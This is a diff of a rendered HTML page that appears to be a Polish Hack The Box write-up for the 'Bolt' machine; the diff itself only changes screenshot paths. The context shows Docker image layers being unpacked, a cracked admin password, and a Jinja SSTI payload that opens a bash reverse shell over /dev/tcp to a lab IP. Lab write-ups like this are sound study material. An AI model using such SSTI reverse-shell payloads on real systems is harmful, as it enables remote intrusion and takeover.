@@ -305,14 +305,14 @@ Found: demo.bolt.htb <span style="color:#f92672">(</span>Status: 302<span style=
 <h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
 <hr>
 <h2 id="port-443">Port 443<a hidden class="anchor" aria-hidden="true" href="#port-443">#</a></h2>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220218164807.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220218164807.png" alt=""  />
 </p>
 <p>Mamy logowanie</p>
 <h2 id="mailbolthtb">mail.bolt.htb<a hidden class="anchor" aria-hidden="true" href="#mailbolthtb">#</a></h2>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220219182310.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220219182310.png" alt=""  />
 </p>
 <h2 id="demobolthtb">demo.bolt.htb<a hidden class="anchor" aria-hidden="true" href="#demobolthtb">#</a></h2>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220219182330.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220219182330.png" alt=""  />
 </p>
 <p>Co ciekawe z obu stron (<code>bolt.htb</code>, <code>passbolt.bolt.htb</code>) można pobrać obraz Dockera <code>image.tar</code>. Sprawdziłem oba pobrane obrazy <code>md5sum</code>. Są takie same.</p>
 <p>Zawartość archiwum:</p>
@@ -339,7 +339,7 @@ drwxr-xr-x <span style="color:#ae81ff">1</span> root   root     <span style="col
 </code></pre></div><p>Przejrzałem kilka tych folderów, każdy zawiera kolejny plik <code>layer.tar</code>. Zatem postanowiłem rozpakować też te wszystkie archiwa. Wykorzystałem polecenie</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -type f -iname <span style="color:#e6db74">&#34;*.tar&#34;</span> -print0 -execdir tar xf <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> -delete
 </code></pre></div><p>Teraz pierwszy folder wygląda tak</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220219192518.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220219192518.png" alt=""  />
 </p>
 <p>Ponieważ jest tego sporo, postanowiłem spróbować poszukać czegoś <code>grepem</code>.</p>
 <p>No tylko tutaj <code>grep</code> niestety nie daje rady, za dużo jest tych podfolderów i za długo to trwa. Postanowiłem ograniczyć szukanie do 2 podfolderów i szukać jakichś maili, ponieważ mamy kilka formularzów do logowania z mailem.</p>
@@ -404,11 +404,11 @@ $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
 
 </code></pre></div><p><code>admin:deadbolt</code></p>
 <p>Hasło zadziałało na subdomene <code>bolt.htb</code>.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223133615.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223133615.png" alt=""  />
 </p>
 <p>Natomiast nic ciekawego tutaj nie znalazłem. Postanowiłem poszukać jeszcze na pozostałych subdomenach. Na <code>mail.bolt.htb</code> na te dane logowania, odpowiedź jest nieco inna niż przy niepoprawnych danych.</p>
 <p>Otrzymujemy taką odpowiedź</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223135823.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223135823.png" alt=""  />
 </p>
 <p>Normalnie, przy losowych danych komunikat to po prostu <code>Login failed.</code></p>
 <p>Spróbowałem czegoś z <code>BurpSuite</code>, ale okazało się to błędnym tropem</p>
@@ -435,38 +435,38 @@ $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir output
 cd output
 <span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>cat layers<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> tar -C output -xvf $i; <span style="color:#66d9ef">done</span>
-</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223153016.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223153016.png" alt=""  />
 </p>
 <p>W ten sposób otrzymujemy składny system plików. Warto spojrzeć na nietypowy folder <code>app</code>.</p>
 <p>W folderze <code>app</code> mamy rozgałęzienie na <code>home</code> oraz <code>base</code>. Foldery różnią się od siebie. Mianowicie w podfolderze <code>base</code> znajdziemy informacje o rejestracji użytkowników.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223154020.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223154020.png" alt=""  />
 </p>
 <p>Wykorzystując mój stary skrypt z wypakowaniem każdego <code>layer.tar</code> w danym folderze możemy znaleźć dodatkowy plik</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223155449.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223155449.png" alt=""  />
 </p>
 <p>No i w pliku <code>./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py</code> mamy dodatkową treść, której wcześniej nie widzieliśmy.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223155539.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223155539.png" alt=""  />
 </p>
 <p>code = XNSS-HSJW-3NGU-8XTJ</p>
 <hr>
 <h3 id="nowy-użytkownik">Nowy użytkownik<a hidden class="anchor" aria-hidden="true" href="#nowy-użytkownik">#</a></h3>
 <p>Stworzyłem nowego użytkownika. Udało mi się zalogować tymi danymi logowania nie tylko na <code>demo.bolt.htb</code>, ale również na <code>mail.bolt.htb</code>. Podatny okazuje sie ten formularz</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223161244.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223161244.png" alt=""  />
 </p>
 <p>Gdy wpisałem losowe rzeczy, na subdomene z mailem przyszła wiadomość</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223161315.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223161315.png" alt=""  />
 </p>
 <p>Jak się okazuje, jest to podatność <code>SSTI</code>, ktorą można wykorzystać.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223162215.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223162215.png" alt=""  />
 </p>
 <p>To jest akurat ciekawe, ponieważ całkowicie pominąłem nazwę <code>Jinja</code> w tytule stron</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223162404.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223162404.png" alt=""  />
 </p>
 <p>A to potencjalnie też ważna informacja.</p>
 <p>Na <code>PayloadAllTheThings</code> można znaleźć najważniejsze informacje jak wykorzystać tą podatność.</p>
 <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span> self._TemplateReference__context.cycler.__init__.__globals__.os.popen<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.15.13/8000 0&gt;&amp;1&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
-</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223163127.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220223163127.png" alt=""  />
 </p>
 <hr>
 <h3 id="www-data">www-data<a hidden class="anchor" aria-hidden="true" href="#www-data">#</a></h3>
